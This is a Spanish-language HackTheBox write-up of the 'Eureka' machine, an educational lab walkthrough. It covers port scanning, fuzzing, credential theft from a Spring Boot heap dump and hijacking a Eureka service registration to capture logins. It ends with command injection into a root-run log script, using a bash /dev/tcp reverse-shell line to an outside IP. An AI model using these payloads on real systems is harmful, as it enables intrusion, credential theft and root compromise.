---
title: Eureka HTB
published: 2025-04-02
description: Resolviendo la maquina Eureka de HackTheBox.
tags: [HTB, Fuzzing, RCE,  Java HPROF dump, Spring Eureka]
image: "./images/1.jpeg"
category: WriteUp
draft: False
---

Toca maquina de HTB!!!!!!!!!


Primero agrega la dirección de la maquina a tu HTB para que sepa a donde debe de resolver 
`/etc/hosts`
![paste](./images/2.jpeg)

# Fase de Reconocimiento 

Iniciamos haciendo un reconocimiento de los puertos de la maquina y saber que servicio están por estos mismos (lo normal)

```bash 
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.66 -oG Ports

PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 63
80/tcp   open  http    syn-ack ttl 63
8761/tcp open  unknown syn-ack ttl 63
```

```bash 
❯ nmap -sCV -p22,80,8761 10.10.11.66 -oN PortInfo

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d6:b2:10:42:32:35:4d:c9:ae:bd:3f:1f:58:65:ce:49 (RSA)
|   256 90:11:9d:67:b6:f6:64:d4:df:7f:ed:4a:90:2e:6d:7b (ECDSA)
|_  256 94:37:d3:42:95:5d:ad:f7:79:73:a6:37:94:45:ad:47 (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Furni | Home
|_http-server-header: nginx/1.18.0 (Ubuntu)
8761/tcp open  unknown
| fingerprint-strings: 
|   GetRequest: 
```

ok tenemos la siguiente infromacion:
- puerto 22 es ssh para poder entrar en el servidor 
- puerto 80 es un servidor web
- puerto 8761 parece ser un API 

Si entramos al servicio web por el puerto 80 veremos la pagina, con temática de venta de muebles en especifico sillones  

![paste](./images/3.jpeg)

Debemos de registrarnos para poder comenzar 

![paste](./images/4.jpeg)

Tenemos a un posible usuario en el apartado de `sevices`

- Maria Jones 

![paste](./images/5.jpeg)

en el apartado del `blog` tenemos la opción de comentar (el cual no es vulnerable a XSS)

![paste](./images/6.jpeg)


Mas posibles usuarios existentes en el servidor 
- Martin Morgan
- Carol Johnson 

![paste](./images/7.jpeg)
![paste](./images/8.jpeg)

Bien después de un rato tanteando la maquina no he podido encontrar alguna brecha por lo cual procedemos al Fuzzing que vamos hacer en este caso probé con Gobuster y Wfuzz y ninguno me arrojo resultados hasta que probamos con `dirsearch` 

Yo ocupo parrot y para instalar dirsearch se necesita crear un entorno virtual, por que?, la verdad es que no lo se pero se tiene que hacer 

## Creación de un venv en Parrot
si no tienes problemas con el `pip install`
salta esta parte 

- Primero 
```python
python3 -m venv nombre_que_quieras #name the venv
```

- te va a crear una carpeta con ese mismo nombre 

- Accedes a `nombre_de_tu_entorno/bin/` (`name_your_venv/bin/`)

  
- debe de existir un archivo llamado ``activate`` 

``` bash
$ source activate
```

## Instalar dirsearch

y ya instalas `dirsearch`

```bash
git clone https://github.com/maurosoria/dirsearch.git
cd dirsearch
pip install -r requirements.txt
```


# Fuzzing con dirsearch

Bien para ejecutar esta herramienta hermosa solo basta ejecutar el siguiente comando 

```bash 
> python3 dirsearch.py -u http://furni.htb/
```


los resultados muestra algo interesante y es que existe una ruta llamada `actuator` , la pagina web esta ocupando JS para las funciones del API y esta ruta podría ser los endpoints

![paste](./images/9.jpeg)

si entramos a esta ruta podemos ver lo siguiente, esta ruta llamada como actuator es perteneciente a , **Spring Boot Actuator**

por si no sabes que es un endpoints es un Api como tal y estas direcciones que se muestran a continuación  son las que se usan para varias operatorias o funcionalidades de la web, como para registrar un usuario o para iniciar sección etc 

mas información aquí -> [Endpoints :: Spring Boot](https://docs.spring.io/spring-boot/reference/actuator/endpoints.html)

![paste](./images/10.jpeg)

Bien después de un tiempo encontré un endpoint que nos descarga un archivo de tipo  `Java HPROF dump`
 En especifico el endpoint es este 
```url
"http://furni.htb/actuator/threaddump"
```

![paste](./images/11.jpeg)

Este nos descarga el archivo llamado `heapdump` 
![paste](./images/12.jpeg)

El **Java HPROF dump** (`.hprof`) es un archivo de volcado de memoria de una aplicación Java. Se usa principalmente para **diagnosticar problemas de rendimiento, analizar fugas de memoria y examinar el estado del heap en un momento específico**

Con ese significado el archivo claramente tiene fuga de credenciales y para poder verlas ocuparemos el siguiente comando  

```bash
❯ strings heapdump | less > headpdump.txt

❯ grep 'password' headpdump.txt
```

Y como te darás cuenta tenemos un usuario y contraseña para poder acceder al servidor   

![paste](./images/13.jpeg)
![paste](./images/14.jpeg)

y si ya puedes decir la frase "Estoy dentro" 

![paste](./images/xd.jpeg)


# Dentro de furni.htb


Estamos como el usuario de Oscar123, toca elevar privilegios para ello veremos que usuarios existen dentro de la maquina

  
```bash

root:x:0:0:root:/root:/bin/bash

oscar190:x:1000:1001:,,,:/home/oscar190:/bin/bash #Estamos aqui #your user

miranda-wise:x:1001:1002:,,,:/home/miranda-wise:/bin/bash

```

  
Bien toca migrar a uno de esos dos, te imaginas que con un `sudo su` no vamos a root , te imaginassss

Bien antes de empezar a buscar tenemos en cuenta que Sprtint esta corriendo y en nuestro Fuzzing no ostro una dirección de /Admin veamos si esta pertenece a admin y también recuerden que tenemos el puerto 8761 el cual en Nmap nos arrojaba una pagina a la cual no podemos acceder

Archivos de configuración de Spring Boot que podemos encontrar

- Revisa el archivo application.properties o application.yml, que generalmente

y si en efecto si existe y con ellos un usuario y una contraseña

  
![paste](./images/15.jpeg)

Accedemos al puerto y nos pedirá las credenciales que encontramos  

![paste](./images/16.jpeg)

Y de esta manera podremos ver un Panel con información del spring Eureka

![paste](./images/17.jpeg)


## SSRF en Eureka

  
Spring Eureka cuenta con una vulnerabilidad de tipo SSRF en el cual podemos secuestrar una de las instancias existente para obtener credenciales
Cunado entras al Spring Eureka te pide credenciales para poder acceder y posiblemente algún usuario también lo este haciendo por ene vamos a suplantar una instancia y si tenemos suerte podremos obtener otras credenciales de algún otro usuario

  
```bash

❯ curl -X POST http://EurekaSrvr:0scarPWDisTheB3st@furni.htb:8761/eureka/apps/USER-MANAGEMENT-SERVICE \

-H "Content-Type: application/json" \

-d '{

  "instance": {

    "instanceId": "USER-MANAGEMENT-SERVICE",

    "hostName": "10.10.x.x" ,  

    "app": "USER-MANAGEMENT-SERVICE",

    "ipAddr": "10.10.x.x",

    "vipAddress": "USER-MANAGEMENT-SERVICE",

    "secureVipAddress": "USER-MANAGEMENT-SERVICE",

    "status": "UP",

    "port": { "$": 8081, "@enabled": "true" },

    "dataCenterInfo": {

      "@class": "com.netflix.appinfo.InstanceInfo$DefaultDataCenterInfo",

      "name": "MyOwn"

    }

  }

}'

```

  

la explicación es la siguiente

- `curl -X POST`: Ejecuta una solicitud HTTP POST con curl.
- `http://EurekaSrvr:0scarPWDisTheB3st@furni.htb:8761/eureka/apps/USER-MANAGEMENT-SERVICE`: Esta es la URL de destino con los siguientes componentes:
    - `EurekaSrvr:0scarPWDisTheB3st@`: Credenciales de autenticación (nombre de usuario y contraseña)
    - `furni.htb:8761`: El host y puerto del servidor Eureka
    - `/eureka/apps/USER-MANAGEMENT-SERVICE`: La ruta específica para registrar el servicio
    - ![paste](./images/18.jpeg)

- `-H 'Content-Type: application/json'`: Establece una cabecera HTTP que especifica que el contenido enviado es JSON.
- `-d '...'`: Los datos que se envían en formato JSON, que contienen la información de la instancia:
    - `instanceId`: Identificador único de la instancia
    - `hostName`: El nombre del host (a reemplazar con tu IP)
    - `app`: Nombre de la aplicación
    - `ipAddr`: Dirección IP de la instancia (a reemplazar con tu IP)
    - `vipAddress` y `secureVipAddress`: Direcciones virtuales para el balanceo de carga
    - `status`: Estado de la instancia ("UP" significa que está activa)
    - `port`: Puerto en el que se ejecuta el servicio (8081)
    - `dataCenterInfo`: Información sobre el centro de datos

En pocas palabras estamos redirigiendo los datos a nuestro servidor de atacante

Para eso también nos pondremos en escucha por el puerto que pusimos que es el 8081 

 ```bash
 nc -lvnp 8081
```

 Quedando de la siguiente manera

![paste](./images/19.jpeg)

![paste](./images/20.jpeg)

Obtenemos nuevas credenciales del usuario miranda-wise que si recordáis es un usuario existente en nuestra maquina, lo puedes comprobar en el /etc/passwd

![paste](./images/21.jpeg)
  
# Miranda furni.htb

Estando ahora como el usuario miranda ya podemos ver la primera Flag, que buen hacker eres

![paste](./images/22.jpeg)]

Buscando por rutas comunes logre encontrar en el directorios de /opt el siguiente script de bash el cual no podemos modificar  pero si ver el contenido y también ejecutarlo pero pide un archivo el cual nosotros no podemos crear

![paste](./images/23.jpeg)
```bash
-rwxrwxr-x 1 root root     4980 Mar 20 14:17 log_analyse.sh

drwxr-x--- 2 root root     4096 Apr  9 18:34 scripts

miranda-wise@eureka:/opt$ cat log_analyse.sh
```

## Análisis de log_analyse.sh

Dentro del script (Aclaro aquí solo esta una parte que nos interés) tenemos lo siguiente

``` bash
#!/bin/bash

# Colors
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
RESET='\033[0m'

  
LOG_FILE="$1"
OUTPUT_FILE="log_analysis.txt"

declare -A successful_users  # Associative array: username -> count
declare -A failed_users      # Associative array: username -> count
STATUS_CODES=("200:0" "201:0" "302:0" "400:0" "401:0" "403:0" "404:0" "500:0") # Indexed array: "code:count" pairs

  
if [ ! -f "$LOG_FILE" ]; then

    echo -e "${RED}Error: Log file $LOG_FILE not found.${RESET}"

    exit 1

fi  

analyze_logins() {

    # Process successful logins

    while IFS= read -r line; do

        username=$(echo "$line" | awk -F"'" '{print $2}')

        if [ -n "${successful_users[$username]+_}" ]; then

            successful_users[$username]=$((successful_users[$username] + 1))

        else

            successful_users[$username]=1

        fi

    done < <(grep "LoginSuccessLogger" "$LOG_FILE")

  

    # Process failed logins

    while IFS= read -r line; do

        username=$(echo "$line" | awk -F"'" '{print $2}')

        if [ -n "${failed_users[$username]+_}" ]; then

            failed_users[$username]=$((failed_users[$username] + 1))

        else

            failed_users[$username]=1

        fi

    done < <(grep "LoginFailureLogger" "$LOG_FILE")

}


analyze_http_statuses() {

    # Process HTTP status codes

    while IFS= read -r line; do

        code=$(echo "$line" | grep -oP 'Status: \K.*')

        found=0

        # Check if code exists in STATUS_CODES array

        for i in "${!STATUS_CODES[@]}"; do

            existing_entry="${STATUS_CODES[$i]}"

            existing_code=$(echo "$existing_entry" | cut -d':' -f1)

            existing_count=$(echo "$existing_entry" | cut -d':' -f2)

            if [[ "$existing_code" -eq "$code" ]]; then

                new_count=$((existing_count + 1))

                STATUS_CODES[$i]="${existing_code}:${new_count}"

                break

            fi

        done

    done < <(grep "HTTP.*Status: " "$LOG_FILE")

}

analyze_log_errors(){

     # Log Level Counts (colored)

    echo -e "\n${YELLOW}[+] Log Level Counts:${RESET}"

    log_levels=$(grep -oP '(?<=Z  )\w+' "$LOG_FILE" | sort | uniq -c)

    echo "$log_levels" | awk -v blue="$BLUE" -v yellow="$YELLOW" -v red="$RED" -v reset="$RESET" '{

        if ($2 == "INFO") color=blue;

        else if ($2 == "WARN") color=yellow;

        else if ($2 == "ERROR") color=red;

        else color=reset;

        printf "%s%6s %s%s\n", color, $1, $2, reset

    }'

  
    # ERROR Messages

    error_messages=$(grep ' ERROR ' "$LOG_FILE" | awk -F' ERROR ' '{print $2}')

    echo -e "\n${RED}[+] ERROR Messages:${RESET}"

    echo "$error_messages" | awk -v red="$RED" -v reset="$RESET" '{print red $0 reset}'

  

    # Eureka Errors

    eureka_errors=$(grep 'Connect to http://localhost:8761.*failed: Connection refused' "$LOG_FILE")

    eureka_count=$(echo "$eureka_errors" | wc -l)

    echo -e "\n${YELLOW}[+] Eureka Connection Failures:${RESET}"

    echo -e "${YELLOW}Count: $eureka_count${RESET}"

    echo "$eureka_errors" | tail -n 2 | awk -v yellow="$YELLOW" -v reset="$RESET" '{print yellow $0 reset}'

}

```

El script sirve para hacer un análisis de logs, ejecutado por el usuario `root`, es susceptible a una vulnerabilidad de Ejecución de Código Remoto (RCE). Esta vulnerabilidad se debe a la **falta de sanitización de las entradas del archivo de registro**, lo que nos permite inyectar comandos maliciosos dentro de la estructura esperada del archivo de log.

  
El flujo de trabajo del script es el siguiente:

- Busca los log que están en la ruta de `/var/www/web/user-management-service/log/application.log`

```bash
#!/bin/bash

# ... (definiciones de colores y variables) ...

LOG_FILE="$1"

# ... (resto del script) ...

if [ ! -f "$LOG_FILE" ]; then
    echo -e "${RED}Error: Log file $LOG_FILE not found.${RESET}"
    exit 1
fi

# ... (funciones de análisis que utilizan "$LOG_FILE") ...

```

- Los lee y filtra por lo que le interesa es decir lo que va despues de la palabra ``HTTP.*Status``

```bash

analyze_http_statuses() {

    while IFS= read -r line; do

        code=$(echo "$line" | grep -oP 'Status: \K.*')

        # ... (código posterior que utiliza la variable 'code') ...

    done < <(grep "HTTP.*Status: " "$LOG_FILE")

}

```

- Y los guarda en un archivo

  
El problema o la brecha de seguridad ocurre en esta parte

```bash

analyze_http_statuses() {

    while IFS= read -r line; do

        code=$(echo "$line" | grep -oP 'Status: \K.*')

        # ... (código posterior que utiliza la variable 'code') ...

    done < <(grep "HTTP.*Status: " "$LOG_FILE")

}

```

Al momento de extraer lo que sigue de HTTP Status no verifica si es un comando por ende cuando lo procesa lo ejecuta

```bash

analyze_http_statuses() {

    while IFS= read -r line; do

        code=$(echo "$line" | grep -oP 'Status: \K.*')

        found=0

        # Check if code exists in STATUS_CODES array

        for i in "${!STATUS_CODES[@]}"; do

            existing_entry="${STATUS_CODES[$i]}"

            existing_code=$(echo "$existing_entry" | cut -d':' -f1)

            existing_count=$(echo "$existing_entry" | cut -d':' -f2)

            if [[ "$existing_code" -eq "$code" ]]; then

                new_count=$((existing_count + 1))

                STATUS_CODES[$i]="${existing_code}:${new_count}"

                break

            fi

        done

    done < <(grep "HTTP.*Status: " "$LOG_FILE")

}

```


- **`while IFS= read -r line; do ... done < <(grep "HTTP.*Status: " "$LOG_FILE")`**: Este bucle lee cada línea del archivo de log que contiene la cadena "HTTP" seguida de "Status: ". La línea maliciosa que inyectaste (`HTTP Status: x[$(/bin/bash -i >& /dev/tcp/10.10.14.71/1337 0>&1)]`) cumple con este patrón, por lo que será procesada por este bucle.

- **`code=$(echo "$line" | grep -oP 'Status: \K.*')`**: Esta es la línea clave donde se procesa el comando malicioso.

    - `echo "$line"`: Envía la línea completa del log (incluyendo el código inyectado) a la tubería.
    - `grep -oP 'Status: \K.*'`: Esta parte del comando busca la cadena "Status: " y, gracias a la opción `-oP` y `\K`, extrae solo la parte que sigue a "Status: ". En el caso de la línea maliciosa, la variable `code` contendrá:

        ```

        x[$(/bin/bash -i >& /dev/tcp/10.10.14.71/1337 0>&1)]

        ```

    - **`code=$(...)`**: La **sustitución de comandos** (`$()`) hace que el shell intente ejecutar el contenido dentro de los paréntesis _antes_ de que se asigne a la variable `code`.
    **¡Aquí es donde ocurre la ejecución del comando malicioso!** El shell interpreta `/bin/bash -i >& /dev/tcp/10.10.14.71/1337 0>&1` como un comando a ejecutar. Este comando intenta iniciar una shell interactiva y redirigir su entrada y salida a la dirección IP y puerto especificados, estableciendo la reverse shell.

algo así en pocas palabras:

![paste](./images/chibi.jpeg)

  
y con esto explicado procedemos ha hacer los pasos para que funcione

# Root Pwned?

Primero eliminamos el archivo de application.log para poder escribir en el

```bash

miranda-wise@eureka:~$ rm -f /var/www/web/user-management-service/log/application.log

```

después lo creamos pero agregamos el comando que nos dará una reverse shell

```bash

miranda-wise@eureka:~$ echo 'HTTP Status: x[$(/bin/bash -i >& /dev/tcp/10.10.14.71/1337 0>&1)]' > /var/www/web/user-management-service/log/application.log

```

Rápidamente o si no es que antes nos ponemos en escucha por el puerto que pusimos  y obtendremos nuestra reverse shell como root

![paste](./images/24.jpeg)

Y así Eureka is Pwned  se feliz hijo

![paste](./images/Eureka.jpeg)